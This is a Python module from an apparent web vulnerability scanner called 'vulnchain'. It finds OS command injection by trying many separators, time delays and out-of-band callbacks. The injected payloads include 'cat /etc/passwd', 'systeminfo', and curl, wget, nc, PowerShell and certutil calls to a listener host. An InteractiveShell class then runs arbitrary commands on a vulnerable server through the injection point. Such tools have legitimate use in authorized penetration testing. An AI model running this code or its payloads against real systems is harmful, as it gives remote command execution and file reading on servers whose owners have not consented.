"""Command Injection module for automated testing with OOB detection

This module implements:
- Command injection testing with multiple separators (;, |, &, &&, ||)
- Blind RCE detection using OOB callbacks
- Integration with OOB Listener for callback correlation
- Interactive shell interface after successful injection
"""

import asyncio
import re
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Dict, List, Optional, Tuple

from src.vulnchain.core.request_handler import RequestHandler, Response
from src.vulnchain.core.payload_engine import PayloadEngine
from src.vulnchain.core.oob_listener import OOBListener
from src.vulnchain.models.target import TargetConfig


class CommandInjectionType(Enum):
    """Types of command injection techniques"""
    
    DIRECT = "direct"  # Direct output visible
    BLIND_TIME = "blind_time"  # Time-based blind
    BLIND_OOB = "blind_oob"  # Out-of-band blind


class CommandSeparator(Enum):
    """Command separators for injection"""
    
    SEMICOLON = ";"
    PIPE = "|"
    AMPERSAND = "&"
    DOUBLE_AMPERSAND = "&&"
    DOUBLE_PIPE = "||"
    NEWLINE = "\n"
    BACKTICK = "`"
    DOLLAR_PAREN = "$("


@dataclass
class InjectionPoint:
    """Represents a potential command injection point"""
    
    parameter: str
    location: str  # query, post, header, cookie
    original_value: str
    url: str
    method: str = "GET"
    headers: Dict[str, str] = field(default_factory=dict)
    data: Optional[Dict[str, str]] = None


@dataclass
class CommandInjectionResult:
    """Result of command injection testing"""
    
    injection_point: InjectionPoint
    is_vulnerable: bool
    injection_type: Optional[CommandInjectionType] = None
    separator: Optional[str] = None
    payload: Optional[str] = None
    confidence: float = 0.0
    output: Optional[str] = None
    response_time: Optional[float] = None
    oob_callback_id: Optional[str] = None
    evidence: List[str] = field(default_factory=list)
    metadata: Dict = field(default_factory=dict)


class CommandInjectionTester:
    """Command Injection testing with OOB detection"""
    
    # Common command injection indicators in responses
    COMMAND_OUTPUT_PATTERNS = [
        r"uid=\d+\([^)]+\)",  # Unix user ID
        r"gid=\d+\([^)]+\)",  # Unix group ID
        r"root:x:\d+:\d+",  # /etc/passwd entry
        r"[A-Z]:\\",  # Windows path
        r"total \d+",  # ls -la output
        r"drwx",  # Directory permissions
        r"-rw-",  # File permissions
        r"Volume in drive",  # Windows dir output
        r"Directory of",  # Windows dir output
    ]
    
    def __init__(
        self,
        request_handler: RequestHandler,
        oob_listener: Optional[OOBListener] = None,
        payload_engine: Optional[PayloadEngine] = None,
    ):
        """Initialize command injection tester
        
        Args:
            request_handler: Request handler for HTTP communication
            oob_listener: Optional OOB listener for blind RCE detection
            payload_engine: Optional payload engine for wordlists
        """
        self.request_handler = request_handler
        self.oob_listener = oob_listener
        self.payload_engine = payload_engine or PayloadEngine()
        self._load_default_payloads()
    
    def _load_default_payloads(self):
        """Load default command injection payloads"""
        # Direct command injection payloads (with output)
        direct_payloads = [
            # Unix/Linux commands
            "id",
            "whoami",
            "pwd",
            "uname -a",
            "cat /etc/passwd",
            "ls -la",
            "ps aux",
            # Windows commands
            "whoami",
            "dir",
            "ipconfig",
            "systeminfo",
            "type C:\\Windows\\win.ini",
        ]
        
        # Time-based blind payloads
        time_based_payloads = [
            # Unix/Linux
            "sleep 5",
            "ping -c 5 127.0.0.1",
            # Windows
            "timeout /t 5",
            "ping -n 5 127.0.0.1",
        ]
        
        # Add payloads to engine
        for payload in direct_payloads:
            self.payload_engine.add_custom_payload(payload, "cmd_direct")
        
        for payload in time_based_payloads:
            self.payload_engine.add_custom_payload(payload, "cmd_time_based")
    
    async def test_injection_point(
        self,
        injection_point: InjectionPoint,
        techniques: Optional[List[CommandInjectionType]] = None,
    ) -> List[CommandInjectionResult]:
        """Test an injection point with specified techniques
        
        Args:
            injection_point: The injection point to test
            techniques: List of techniques to use (default: all)
        
        Returns:
            List of command injection results
        """
        if techniques is None:
            techniques = list(CommandInjectionType)
        
        results = []
        
        # Test each technique
        for technique in techniques:
            if technique == CommandInjectionType.DIRECT:
                result = await self._test_direct_injection(injection_point)
            elif technique == CommandInjectionType.BLIND_TIME:
                result = await self._test_time_based_blind(injection_point)
            elif technique == CommandInjectionType.BLIND_OOB:
                if self.oob_listener:
                    result = await self._test_oob_blind(injection_point)
                else:
                    continue
            else:
                continue
            
            if result:
                results.append(result)
                
                # If we found a vulnerability, we can stop testing
                if result.is_vulnerable:
                    break
        
        return results
    
    async def _test_direct_injection(
        self, injection_point: InjectionPoint
    ) -> Optional[CommandInjectionResult]:
        """Test for direct command injection with visible output
        
        Args:
            injection_point: The injection point to test
        
        Returns:
            CommandInjectionResult if vulnerability found, None otherwise
        """
        # Get baseline response
        baseline_response = await self._send_request(injection_point, injection_point.original_value)
        baseline_text = baseline_response.text
        
        # Test each separator
        separators = [
            CommandSeparator.SEMICOLON.value,
            CommandSeparator.PIPE.value,
            CommandSeparator.AMPERSAND.value,
            CommandSeparator.DOUBLE_AMPERSAND.value,
            CommandSeparator.DOUBLE_PIPE.value,
            CommandSeparator.NEWLINE.value,
            CommandSeparator.BACKTICK.value,
            CommandSeparator.DOLLAR_PAREN.value + ")",
        ]
        
        for separator in separators:
            # Test direct command payloads
            for payload_obj in self.payload_engine.get_payloads("cmd_direct"):
                command = payload_obj.encoded
                
                # Construct injection payload
                if separator == CommandSeparator.BACKTICK.value:
                    injection_payload = f"{injection_point.original_value}`{command}`"
                elif separator == CommandSeparator.DOLLAR_PAREN.value + ")":
                    injection_payload = f"{injection_point.original_value}$({command})"
                else:
                    injection_payload = f"{injection_point.original_value}{separator}{command}"
                
                # Send request with payload
                response = await self._send_request(injection_point, injection_payload)
                response_text = response.text
                
                # Check for command output patterns
                output_found, matched_pattern = self._detect_command_output(response_text)
                
                if output_found and matched_pattern not in baseline_text:
                    # Found command output - likely vulnerable
                    return CommandInjectionResult(
                        injection_point=injection_point,
                        is_vulnerable=True,
                        injection_type=CommandInjectionType.DIRECT,
                        separator=separator,
                        payload=injection_payload,
                        confidence=0.95,
                        output=matched_pattern,
                        evidence=[
                            f"Command output detected in response",
                            f"Separator: {separator}",
                            f"Command: {command}",
                            f"Payload: {injection_payload}",
                            f"Output pattern: {matched_pattern[:100]}",
                        ],
                    )
        
        # No vulnerability found
        return CommandInjectionResult(
            injection_point=injection_point,
            is_vulnerable=False,
            injection_type=CommandInjectionType.DIRECT,
            confidence=0.0,
        )
    
    async def _test_time_based_blind(
        self, injection_point: InjectionPoint
    ) -> Optional[CommandInjectionResult]:
        """Test for time-based blind command injection
        
        Args:
            injection_point: The injection point to test
        
        Returns:
            CommandInjectionResult if vulnerability found, None otherwise
        """
        # Measure baseline response time
        baseline_times = []
        for _ in range(3):
            start_time = time.time()
            await self._send_request(injection_point, injection_point.original_value)
            elapsed = time.time() - start_time
            baseline_times.append(elapsed)
            await asyncio.sleep(0.1)
        
        baseline_avg = sum(baseline_times) / len(baseline_times)
        
        # Test each separator
        separators = [
            CommandSeparator.SEMICOLON.value,
            CommandSeparator.PIPE.value,
            CommandSeparator.AMPERSAND.value,
            CommandSeparator.DOUBLE_AMPERSAND.value,
            CommandSeparator.DOUBLE_PIPE.value,
        ]
        
        for separator in separators:
            # Test time-based payloads
            for payload_obj in self.payload_engine.get_payloads("cmd_time_based"):
                command = payload_obj.encoded
                
                # Construct injection payload
                injection_payload = f"{injection_point.original_value}{separator}{command}"
                
                # Expected delay (extract from command)
                expected_delay = self._extract_delay_from_command(command)
                
                # Send request with time-based payload
                start_time = time.time()
                response = await self._send_request(injection_point, injection_payload)
                elapsed_time = time.time() - start_time
                
                # Check if response time indicates injection
                if elapsed_time >= (baseline_avg + expected_delay * 0.8):
                    # Verify with another test
                    start_time = time.time()
                    verify_response = await self._send_request(injection_point, injection_payload)
                    verify_elapsed = time.time() - start_time
                    
                    # Check consistency
                    if verify_elapsed >= (baseline_avg + expected_delay * 0.8):
                        return CommandInjectionResult(
                            injection_point=injection_point,
                            is_vulnerable=True,
                            injection_type=CommandInjectionType.BLIND_TIME,
                            separator=separator,
                            payload=injection_payload,
                            confidence=0.90,
                            response_time=elapsed_time,
                            evidence=[
                                f"Time-based blind command injection detected",
                                f"Separator: {separator}",
                                f"Command: {command}",
                                f"Payload: {injection_payload}",
                                f"Expected delay: {expected_delay}s",
                                f"Actual delay: {elapsed_time:.2f}s",
                                f"Baseline: {baseline_avg:.2f}s",
                                f"Verification delay: {verify_elapsed:.2f}s",
                            ],
                            metadata={
                                "baseline_avg": baseline_avg,
                                "expected_delay": expected_delay,
                                "actual_delay": elapsed_time,
                                "verification_delay": verify_elapsed,
                            },
                        )
        
        # No vulnerability found
        return CommandInjectionResult(
            injection_point=injection_point,
            is_vulnerable=False,
            injection_type=CommandInjectionType.BLIND_TIME,
            confidence=0.0,
        )
    
    async def _test_oob_blind(
        self, injection_point: InjectionPoint
    ) -> Optional[CommandInjectionResult]:
        """Test for blind command injection using OOB callbacks
        
        Args:
            injection_point: The injection point to test
        
        Returns:
            CommandInjectionResult if vulnerability found, None otherwise
        """
        if not self.oob_listener:
            return None
        
        # Test each separator
        separators = [
            CommandSeparator.SEMICOLON.value,
            CommandSeparator.PIPE.value,
            CommandSeparator.AMPERSAND.value,
            CommandSeparator.DOUBLE_AMPERSAND.value,
            CommandSeparator.DOUBLE_PIPE.value,
        ]
        
        for separator in separators:
            # Generate unique OOB identifier
            unique_id = self.oob_listener.generate_unique_id()
            
            # Create OOB payloads for different platforms
            oob_payloads = self._generate_oob_payloads(unique_id)
            
            for command_name, command in oob_payloads.items():
                # Construct injection payload
                injection_payload = f"{injection_point.original_value}{separator}{command}"
                
                # Register payload with OOB listener
                await self.oob_listener.register_payload(
                    unique_id=unique_id,
                    payload=injection_payload,
                    target_url=injection_point.url,
                    injection_point=injection_point.parameter,
                    vulnerability_type="command_injection",
                    metadata={
                        "separator": separator,
                        "command_type": command_name,
                    },
                )
                
                # Send request with OOB payload
                response = await self._send_request(injection_point, injection_payload)
                
                # Wait for OOB callback
                callback = await self.oob_listener.wait_for_callback(unique_id, timeout=10.0)
                
                if callback:
                    # OOB callback received - vulnerable!
                    return CommandInjectionResult(
                        injection_point=injection_point,
                        is_vulnerable=True,
                        injection_type=CommandInjectionType.BLIND_OOB,
                        separator=separator,
                        payload=injection_payload,
                        confidence=0.95,
                        oob_callback_id=callback.callback_id,
                        evidence=[
                            f"OOB callback received - blind RCE confirmed",
                            f"Separator: {separator}",
                            f"Command type: {command_name}",
                            f"Payload: {injection_payload}",
                            f"Callback type: {callback.callback_type}",
                            f"Source IP: {callback.source_ip}",
                            f"Callback ID: {callback.callback_id}",
                        ],
                        metadata={
                            "callback": {
                                "type": callback.callback_type,
                                "source_ip": callback.source_ip,
                                "timestamp": callback.timestamp.isoformat(),
                                "data": callback.data,
                            },
                        },
                    )
        
        # No vulnerability found
        return CommandInjectionResult(
            injection_point=injection_point,
            is_vulnerable=False,
            injection_type=CommandInjectionType.BLIND_OOB,
            confidence=0.0,
        )
    
    def _generate_oob_payloads(self, unique_id: str) -> Dict[str, str]:
        """Generate OOB payloads for different platforms
        
        Args:
            unique_id: Unique identifier for correlation
        
        Returns:
            Dictionary of command name to command string
        """
        http_url = self.oob_listener.get_callback_url(unique_id)
        dns_hostname = self.oob_listener.get_dns_callback(unique_id)
        
        payloads = {
            # Unix/Linux HTTP callbacks
            "curl_http": f"curl {http_url}",
            "wget_http": f"wget {http_url}",
            "nc_http": f"nc -w 1 {self.oob_listener.domain} {self.oob_listener.http_port}",
            
            # Unix/Linux DNS callbacks
            "nslookup_dns": f"nslookup {dns_hostname}",
            "dig_dns": f"dig {dns_hostname}",
            "host_dns": f"host {dns_hostname}",
            "ping_dns": f"ping -c 1 {dns_hostname}",
            
            # Windows HTTP callbacks
            "powershell_http": f"powershell -c \"Invoke-WebRequest -Uri {http_url}\"",
            "certutil_http": f"certutil -urlcache -split -f {http_url}",
            
            # Windows DNS callbacks
            "nslookup_win_dns": f"nslookup {dns_hostname}",
            "ping_win_dns": f"ping -n 1 {dns_hostname}",
        }
        
        return payloads
    
    def _detect_command_output(self, response_text: str) -> Tuple[bool, Optional[str]]:
        """Detect command output patterns in response
        
        Args:
            response_text: Response text to analyze
        
        Returns:
            Tuple of (found, matched_pattern)
        """
        for pattern in self.COMMAND_OUTPUT_PATTERNS:
            match = re.search(pattern, response_text, re.IGNORECASE | re.MULTILINE)
            if match:
                return True, match.group(0)
        
        return False, None
    
    def _extract_delay_from_command(self, command: str) -> float:
        """Extract expected delay from time-based command
        
        Args:
            command: The command string
        
        Returns:
            Expected delay in seconds
        """
        # Look for sleep, timeout, ping delays
        patterns = [
            r"sleep\s+(\d+)",
            r"timeout\s+/t\s+(\d+)",
            r"ping\s+-[cn]\s+(\d+)",
        ]
        
        for pattern in patterns:
            match = re.search(pattern, command, re.IGNORECASE)
            if match:
                return float(match.group(1))
        
        # Default to 5 seconds if not found
        return 5.0
    
    async def _send_request(
        self, injection_point: InjectionPoint, value: str
    ) -> Response:
        """Send request with injected value
        
        Args:
            injection_point: The injection point
            value: The value to inject
        
        Returns:
            Response object
        """
        if injection_point.location == "query":
            # Inject into URL query parameter
            from urllib.parse import urlencode, urlparse, parse_qs, urlunparse
            
            parsed = urlparse(injection_point.url)
            params = parse_qs(parsed.query)
            params[injection_point.parameter] = [value]
            new_query = urlencode(params, doseq=True)
            new_url = urlunparse((
                parsed.scheme,
                parsed.netloc,
                parsed.path,
                parsed.params,
                new_query,
                parsed.fragment,
            ))
            
            return await self.request_handler.send_request(
                method=injection_point.method,
                url=new_url,
                headers=injection_point.headers,
            )
        
        elif injection_point.location == "post":
            # Inject into POST data
            data = injection_point.data.copy() if injection_point.data else {}
            data[injection_point.parameter] = value
            
            return await self.request_handler.send_request(
                method=injection_point.method,
                url=injection_point.url,
                headers=injection_point.headers,
                data=data,
            )
        
        elif injection_point.location == "header":
            # Inject into header
            headers = injection_point.headers.copy()
            headers[injection_point.parameter] = value
            
            return await self.request_handler.send_request(
                method=injection_point.method,
                url=injection_point.url,
                headers=headers,
                data=injection_point.data,
            )
        
        elif injection_point.location == "cookie":
            # Inject into cookie
            cookies = {injection_point.parameter: value}
            
            return await self.request_handler.send_request(
                method=injection_point.method,
                url=injection_point.url,
                headers=injection_point.headers,
                cookies=cookies,
                data=injection_point.data,
            )
        
        else:
            raise ValueError(f"Unsupported injection location: {injection_point.location}")


class InteractiveShell:
    """Interactive shell interface for command injection exploitation"""
    
    def __init__(
        self,
        request_handler: RequestHandler,
        injection_point: InjectionPoint,
        injection_result: CommandInjectionResult,
    ):
        """Initialize interactive shell
        
        Args:
            request_handler: Request handler for HTTP communication
            injection_point: The vulnerable injection point
            injection_result: The successful injection result
        """
        self.request_handler = request_handler
        self.injection_point = injection_point
        self.injection_result = injection_result
        self.command_history: List[Tuple[str, str]] = []
    
    async def execute_command(self, command: str) -> str:
        """Execute a command through the injection point
        
        Args:
            command: Command to execute
        
        Returns:
            Command output
        """
        # Construct injection payload using the known separator
        separator = self.injection_result.separator
        injection_payload = f"{self.injection_point.original_value}{separator}{command}"
        
        # Send request
        response = await self._send_request(injection_payload)
        
        # Store in history
        self.command_history.append((command, response.text))
        
        return response.text
    
    async def _send_request(self, value: str) -> Response:
        """Send request with injected value
        
        Args:
            value: The value to inject
        
        Returns:
            Response object
        """
        if self.injection_point.location == "query":
            # Inject into URL query parameter
            from urllib.parse import urlencode, urlparse, parse_qs, urlunparse
            
            parsed = urlparse(self.injection_point.url)
            params = parse_qs(parsed.query)
            params[self.injection_point.parameter] = [value]
            new_query = urlencode(params, doseq=True)
            new_url = urlunparse((
                parsed.scheme,
                parsed.netloc,
                parsed.path,
                parsed.params,
                new_query,
                parsed.fragment,
            ))
            
            return await self.request_handler.send_request(
                method=self.injection_point.method,
                url=new_url,
                headers=self.injection_point.headers,
            )
        
        elif self.injection_point.location == "post":
            # Inject into POST data
            data = self.injection_point.data.copy() if self.injection_point.data else {}
            data[self.injection_point.parameter] = value
            
            return await self.request_handler.send_request(
                method=self.injection_point.method,
                url=self.injection_point.url,
                headers=self.injection_point.headers,
                data=data,
            )
        
        elif self.injection_point.location == "header":
            # Inject into header
            headers = self.injection_point.headers.copy()
            headers[self.injection_point.parameter] = value
            
            return await self.request_handler.send_request(
                method=self.injection_point.method,
                url=self.injection_point.url,
                headers=headers,
                data=self.injection_point.data,
            )
        
        elif self.injection_point.location == "cookie":
            # Inject into cookie
            cookies = {self.injection_point.parameter: value}
            
            return await self.request_handler.send_request(
                method=self.injection_point.method,
                url=self.injection_point.url,
                headers=self.injection_point.headers,
                cookies=cookies,
                data=self.injection_point.data,
            )
        
        else:
            raise ValueError(f"Unsupported injection location: {self.injection_point.location}")
    
    def get_history(self) -> List[Tuple[str, str]]:
        """Get command execution history
        
        Returns:
            List of (command, output) tuples
        """
        return self.command_history
    
    def clear_history(self):
        """Clear command execution history"""
        self.command_history.clear()
